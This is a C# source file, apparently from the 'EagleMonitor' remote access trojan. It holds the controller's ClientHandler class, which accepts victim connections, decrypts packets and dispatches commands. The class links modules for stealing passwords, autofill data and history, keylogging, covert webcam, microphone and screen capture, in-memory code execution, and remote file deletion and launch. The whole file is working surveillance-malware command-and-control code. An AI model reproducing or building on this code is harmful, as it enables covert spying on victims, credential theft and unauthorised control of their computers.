using EagleMonitor.Forms;
using EagleMonitor.Utils;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Networking
{
    internal class ClientHandler : IDisposable
    {
        internal static Dictionary<string, ClientHandler> ClientHandlersList { get; set; }
        internal static int CurrentClientsNumber { get { return ClientHandlersList.Count; } }
        static ClientHandler() 
        {
            ClientHandlersList = new Dictionary<string, ClientHandler>();
        }

        internal static void SendPacketToMultipleClients(IPacket packet) 
        {
            foreach (DataGridViewRow dataGridViewRow in Program.mainForm.dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(packet);
            }
        }

        internal delegate byte[] ReadDataAsync();
        internal delegate IPacket ReadPacketAsync(byte[] BufferPacket);
        internal delegate IPacket SendDataAsync(IPacket data);


        private readonly ReadDataAsync readDataAsync;
        private readonly ReadPacketAsync readPacketAsync;
        internal readonly SendDataAsync sendDataAsync;


        internal Socket socket { get; set; }
        internal string IP { get; set; }
        internal string HWID { get; set; }
        internal string fullName { get; set; }
        internal DataGridViewRow clientRow { get; set; }
        internal int serverPort { get; set; }
        internal string clientPath { get; set; }
        internal string clientStatus { get; set; }
        internal bool is64bitClient { get; set; }
        internal AudioHelpers audioHelper { get; set; }


        internal PasswordsForm passwordsForm { get; set; }
        internal FileManagerForm fileManagerForm { get; set; }
        internal ProcessManagerForm processManagerForm { get; set; }
        internal KeyloggerForm keyloggerForm { get; set; }
        internal MemoryExecutionForm memoryExecutionForm { get; set; }
        internal HistoryForm historyForm { get; set; }
        internal MiscellaneousForm miscellaneousForm { get; set; }
        internal RemoteDesktopForm remoteDesktopForm { get; set; }
        internal RemoteCameraForm remoteCameraForm { get; set; }
        internal InformationForm informationForm { get; set; }
        internal AutofillForm autofillForm { get; set; }
        internal KeywordsForm keywordsForm { get; set; }
        internal RemoteAudioForm remoteAudioForm { get; set; }
        internal RemoteChatForm chatForm { get; set; }
        internal RemoteCodeForm remoteCodeForm { get; set; }

        internal Dictionary<string, DownloadFileForm> downloadForms;

        internal ClientHandler(Socket sock, int port) 
        {
            downloadForms = new Dictionary<string, DownloadFileForm>();
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            sendDataAsync = new SendDataAsync(SendData);

            this.socket = sock;
            this.IP = socket.RemoteEndPoint.ToString();
            this.serverPort = port;
            Receive();
        }

        internal void Receive()
        {
            if (socket != null)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                return;
        }

        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];
               
                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }
                return data;
            }
            catch (Exception ex)
            {
                SocketException sockError = ex as SocketException;
                if (sockError != null)
                    this.Dispose();
                return null;
            }
        }
        private void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && data.Length > 0)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);

            if (socket != null)
                Receive();
        }

        
        private IPacket PacketParser(byte[] BufferPacket)
        {
            return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);
        }

        private void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);

            if (packet != null)
            {
                switch (packet.packetType)
                {

                    case PacketType.CONNECTED:
                        ClientHandler.ClientHandlersList.Add(this.IP, this);
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.KEYLOG_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.RM_VIEW_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.RC_CAPTURE_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.AUDIO_RECORD_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.CHAT_ON:
                        ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler = this;
                        ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler.HWID = packet.HWID;
                        new PacketHandler(packet, this);
                        break;

                    case PacketType.FM_DOWNLOAD_FILE:
                        new PacketHandler(packet, this);
                        break;

                    default:
                        new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
                        this.Dispose();
                        break;
                }
            }
        }


        internal void SendPacket(IPacket packet) 
        {
            packet.HWID = this.HWID;
            packet.baseIp = this.IP;
            if(socket != null)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }

        private IPacket SendData(IPacket data)
        {
            byte[] encryptedData = data.SerializePacket(Utils.Miscellaneous.settings.key);

            int total = 0;
            int size = encryptedData.Length;
            int datalft = size;
            byte[] header = new byte[5];

            byte[] temp = BitConverter.GetBytes(size);

            header[0] = temp[0];
            header[1] = temp[1];
            header[2] = temp[2];
            header[3] = temp[3];
            header[4] = (byte)data.packetType;

            try
            {
                lock (socket)
                {
                    socket.Poll(-1, SelectMode.SelectWrite);

                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    data.packetState = PacketState.SENT;
                }
            }
            catch (Exception ex)
            {
                data.packetState = PacketState.NOT_SENT;
                data.status = ex.Message;
                SocketException sockError = ex as SocketException;
                if (sockError != null)
                    this.Dispose();
            }
            return data;
        }
        private void SendDataCompleted(IAsyncResult ar)
        {
            IPacket packet = sendDataAsync.EndInvoke(ar);

            packet.datePacketStatus = DateTime.Now.ToString();

            IAsyncResult res = Program.mainForm.dataGridView2.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = Program.mainForm.dataGridView2.Rows.Add();
                DataGridViewRow row = Program.mainForm.dataGridView2.Rows[rowId];
                row.Cells["Column11"].Value = packet.HWID;
                row.Cells["Column12"].Value = packet.baseIp;
                row.Cells["Column13"].Value = packet.packetType.ToString();
                row.Cells["Column14"].Style.ForeColor = Color.FromArgb(66, 182, 245);
                row.Cells["Column14"].Value = packet.packetState;
                row.Cells["Column15"].Value = packet.datePacketStatus;

                if (packet.packetState == PacketState.NOT_SENT)
                {
                    row.Cells["Column16"].Value = packet.status;
                    return;
                }

                else
                {
                    switch (packet.packetType)
                    {
                        case PacketType.FM_DOWNLOAD_FILE:
                            row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
                            break;

                        case PacketType.FM_DELETE_FILE:
                            row.Cells["Column16"].Value = ((DeleteFilePacket)packet).path;
                            break;

                        case PacketType.FM_START_FILE:
                            row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
                            break;

                        case PacketType.FM_GET_FILES_AND_DIRS:
                            row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
                            break;

                        case PacketType.RM_VIEW_OFF:
                            packet = null;
                            this.Dispose();
                            break;

                        case PacketType.RC_CAPTURE_OFF:
                            packet = null;
                            this.Dispose();
                            break;

                        case PacketType.AUDIO_RECORD_OFF:
                            packet = null;
                            this.Dispose();
                            break;

                        case PacketType.CHAT_OFF:
                            packet = null;
                            this.Dispose();
                            break;

                        case PacketType.KEYLOG_OFF:
                            packet = null;
                            this.Dispose();
                            break;
                    }
                }
                Program.mainForm.dataGridView2.ClearSelection();
                Program.mainForm.dataGridView2.CurrentCell = null;

            }));
            Program.mainForm.dataGridView2.EndInvoke(res);
        }

        public void Dispose()
        {
            if (socket != null)
            {
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
                socket.Dispose();
                socket = null;
            }

            if (ClientHandlersList.ContainsKey(this.IP))
                ClientHandlersList.Remove(this.IP);

            if (this.clientRow != null) 
            {
                Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                {
                    Program.mainForm.dataGridView1.Rows.Remove(this.clientRow);
                    Utils.Miscellaneous.CloseForm(passwordsForm);
                    Utils.Miscellaneous.CloseForm(fileManagerForm);
                    Utils.Miscellaneous.CloseForm(processManagerForm);
                    Utils.Miscellaneous.CloseForm(keyloggerForm);
                    Utils.Miscellaneous.CloseForm(memoryExecutionForm);
                    Utils.Miscellaneous.CloseForm(historyForm);
                    Utils.Miscellaneous.CloseForm(miscellaneousForm);
                    Utils.Miscellaneous.CloseForm(remoteDesktopForm);
                    Utils.Miscellaneous.CloseForm(remoteCameraForm);
                    Utils.Miscellaneous.CloseForm(informationForm);
                    Utils.Miscellaneous.CloseForm(autofillForm);
                    Utils.Miscellaneous.CloseForm(keywordsForm);
                    Utils.Miscellaneous.CloseForm(remoteAudioForm);
                    Utils.Miscellaneous.CloseForm(passwordsForm);
                    Utils.Miscellaneous.CloseForm(chatForm);
                    Utils.Miscellaneous.CloseForm(remoteCodeForm);

                    foreach (KeyValuePair<string, DownloadFileForm> file in downloadForms) 
                    {
                        file.Value.clientHandler.Dispose();
                        file.Value.Close();
                    }
                    downloadForms.Clear();
                }));

            }
        }
    }
}
